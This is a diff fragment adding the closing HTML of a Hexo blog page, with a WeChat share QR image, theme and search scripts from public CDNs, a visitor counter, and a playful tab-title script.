+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACJklEQVR42u3aW46jMBQFwOx/07Q0v9OQc66JZmLKX6gDxkVL1n349YrH8We013+P/KnXJwYGBsbXMo7Lkb/s7P4Edj1P9CwGBsYDGPl010+dLT2hzu7BwMDASBZ9BCPh5R8LAwMDY5Ze5mFfEkRiYGBgzJLYNpXNk9i2bIeBgfE0xucaA+vX/0V/AwMD458yjnK0QV5bvJsNDAyMvRlJGpmnqXn62iax0cfCwMDYmjEr8a+U1do5PxIsYmBgfAlj9ljOa39t02kMDIwnMNom4izdzQPQ5LO+6W9gYGBsyphtte3BiBY8S6QxMDB2Zcw2ynsPZ7Rtg1/WhoGBsSlj/XRGG0SuFOZOSRgYGI9hLE1UVuzbYPTNzBgYGFsz8o1v1uAsCmQLhT8MDIy9GbMEdbY55uW5GoaBgbE1Y2W6PB3NmwcrJAwMjL0Z7aGKvNDfltjaYxYYGBjPYczaA3nj87hpFFstBgbGdoxZqNe+sm1C5OU8DAyMvRkrh7fy4xdt2a5OcTEwMB7AuObNymf5PPk9px8UAwNja0byQF2aH/HaxsPp/wQDA2M7xqzglS8ibx4kW+3prxgYGFsz7koj80W071oJTDEwMHZitIX49roNLodbOQYGxgMYd22jbfNgZSPGwMDASEpvKyX+tpHw5kNgYGBgxMcvrv8yCytv6MdiYGBswcg3zZUXt6X/IrnFwMDYmnFXsX7Wepy1AW5oYWJgYHwH4wfADEHP3iELFQAAAABJRU5ErkJggg==" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+<script>
+(function() {
+    var OriginTitile = document.title, titleTime;
+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+            document.title = '死鬼去哪里了！';
+            clearTimeout(titleTime);
+        } else {
+            document.title = '(つェ⊂)咦!又好了!';
+            titleTime = setTimeout(function() {
+                document.title = OriginTitile;
+            },2000);
+        }
+    });
+})();
+</script>
+
+
+
+</body>
+</html>
